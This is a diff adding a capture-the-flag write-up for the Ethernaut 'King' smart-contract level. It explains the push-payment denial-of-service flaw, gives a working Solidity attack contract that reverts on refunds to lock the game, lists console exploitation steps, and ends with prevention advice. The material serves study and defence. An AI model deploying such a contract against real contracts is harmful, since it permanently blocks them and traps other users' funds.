@@ -492,3 +492,156 @@ if (!locked) {
 - **Blockchain Transparency:** Why all on-chain data is public
 - **Access Control:** Proper ways to restrict functionality
 - **Data Privacy:** Strategies for handling sensitive information on public blockchains
+
+## 🪙 Level 9: King
+
+### Overview
+
+This level is a "King of the Hill" contract. To become the new king, a caller must pay at least the current `prize`. The contract then tries to refund the previous king using `transfer` before updating the state. If the refund fails, the whole transaction reverts.
+
+**Goal:** Become king and lock the contract so no one can dethrone you.
+
+---
+
+### 🔓 Vulnerable Code (core idea)
+
+```solidity
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value); // <--- external call that can revert
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+---
+
+### 🔍 Vulnerability Analysis
+
+- **Push payments with `transfer`:** The contract sends ETH to the previous king using `transfer`, which forwards 2300 gas and reverts on any failure.
+- **State updated after external call:** If the refund reverts, the contract never reaches the state update, so no one can become the new king.
+- **Malicious recipient can force failure:** A contract can intentionally revert in `receive()`/`fallback()`, causing every dethroning attempt to fail.
+
+---
+
+### 🛡️ Attack Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IKing {
+    function prize() external view returns (uint256);
+}
+
+contract KingAttack {
+    address payable public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    // Send enough ETH to claim kingship
+    function attack() external payable {
+        (bool ok, ) = target.call{value: msg.value}("");
+        require(ok, "call failed");
+    }
+
+    // Block all refunds to lock the game
+    receive() external payable { revert("no refunds"); }
+    fallback() external payable { revert("no refunds"); }
+}
+```
+
+---
+
+### 🧪 Exploitation Steps
+
+1. Read the current `prize`:
+   ```js
+   const prize = await contract.prize();
+   ```
+2. Deploy `KingAttack` with the level instance address.
+3. Call `attack()` and send `value: prize` (or `prize + 1`):
+   ```js
+   await kingAttack.attack({ value: prize });
+   ```
+4. Verify you are the king:
+   ```js
+   await contract._king(); // should be kingAttack address
+   ```
+5. Try dethroning from an EOA with more ETH — it should revert because your contract rejects the refund.
+
+---
+
+### 📚 Detailed Explanation
+
+- **`transfer` forwards 2300 gas:** This is barely enough for a simple `LOG` and no storage writes. If the recipient reverts or is non-payable, the `transfer` reverts the entire transaction.
+- **Push vs Pull payments:** Pushing ETH during state transitions creates a hard dependency on recipients. If they cannot receive, your logic breaks.
+- **External call before state update:** Combining an external call with state updates in the same function increases fragility and attack surface.
+
+---
+
+### 🪲 Root Cause
+
+Relying on push-based refunds with `transfer` during the critical path of state updates. A refund failure prevents updating the king, allowing a malicious king to brick the contract.
+
+---
+
+### 🛡️ Prevention
+
+- Prefer the **withdraw (pull) pattern**: record balances owed and let users withdraw later.
+- Avoid `transfer`/`send`; use low-level `call` and handle failures gracefully if you must send.
+- Apply **checks-effects-interactions**: update state first, then interact, or decouple payments entirely.
+- Consider adding an emergency path or owner override (carefully designed) to recover from blocked refunds.
+
+---
+
+### 🧪 Complete Exploit (JS + Solidity)
+
+```solidity
+// KingAttack.sol
+pragma solidity ^0.8.0;
+contract KingAttack {
+    address payable public target;
+    constructor(address payable _target) { target = _target; }
+    function attack() external payable {
+        (bool ok,) = target.call{value: msg.value}("");
+        require(ok, "call failed");
+    }
+    receive() external payable { revert("no refunds"); }
+    fallback() external payable { revert("no refunds"); }
+}
+```
+
+```js
+// Console
+const prize = await contract.prize();
+await kingAttack.attack({ value: prize });
+await contract._king(); // => kingAttack address
+```
+
+---
+
+### 🔗 Related Concepts
+
+- **Push vs Pull Payments**
+- **`transfer`/`send` vs `call`**
+- **Checks-Effects-Interactions**
+- **Denial-of-Service via unexpected revert**
